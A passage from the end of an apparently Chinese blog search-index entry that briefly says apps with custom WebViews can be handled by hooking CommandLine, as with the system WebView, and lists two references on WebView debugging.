<h2 id="APP自己实现的webview"><a href="#APP自己实现的webview" class="headerlink" title="APP自己实现的webview"></a>APP自己实现的webview</h2><p>  和系统的webview做法一样, 找到合适的位置直接hook <code>CommandLine</code> 就行, 不同厂商做法不太一样,这个需要自己逆向一下</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://juejin.cn/post/6847902219757420552">https://juejin.cn/post/6847902219757420552</a><br><a href="https://developer.android.com/develop/ui/views/layout/webapps/debugging#java">https://developer.android.com/develop/ui/views/layout/webapps/debugging#java</a></p>
]]></content>
      <categories>
        <category>环境配置踩坑</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>chrome</tag>
        <tag>webview</tag>
      </tags>
  </entry>
</search>
